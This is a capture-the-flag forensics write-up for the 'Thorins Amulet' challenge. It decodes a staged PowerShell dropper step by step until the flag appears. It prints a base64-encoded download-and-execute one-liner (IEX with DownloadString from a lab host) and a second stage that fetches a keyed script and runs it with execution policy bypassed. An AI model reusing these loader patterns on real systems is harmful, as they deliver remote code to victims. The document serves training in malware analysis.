---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Thorins Amulet Writeup
desc: Check out our writeup for Thorins Amulet for Cyber Apocalypse 2025 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: forensics
challenge: Thorins Amulet
tags: "forensics, starry, powershell"
date: 2025-03-29T00:00:00+00:00
last_modified_at: 2025-03-29T00:00:00+00:00
---





> Solved by Starry-Lord


![](https://i.imgur.com/KHsPmEl.png)


inside the zip downloadable we could find `artifact.ps1` :


    function qt4PO {
        if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
            exit
        }
        powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
    }
    qt4PO

Base 64 string decoded to the following:


    IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")

But it was not giving a connection unless you had the correct `COMPUTERNAME` environment variable. This will temporarily change it:


    $env:COMPUTERNAME = "WORKSTATION-DM-0043"

With that we could run the PowerShell if we wanted, but visiting the URL from the challenge docker was enough to get to the next stage which returned a `update.ps1`:


    function aqFVaq {
        Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
        powershell.exe -exec Bypass -File "a541a.ps1"
    }
    aqFVaq

This time I used curl with headers in order to pass the `X-ST4G3R-KEY` which was needed to get the last bit:

curl command:

    curl -H "X-ST4G3R-KEY:5337d322906ff18afedc1edc191d325d" http://94.237.57.230:59390/a541a

a541a.ps1:

    $a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
    ($a35-split"(..)"|?{$_}|%{\[char\][convert]::ToInt16($_,16)}) -join ""

Decode hex for the flag:

    HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}


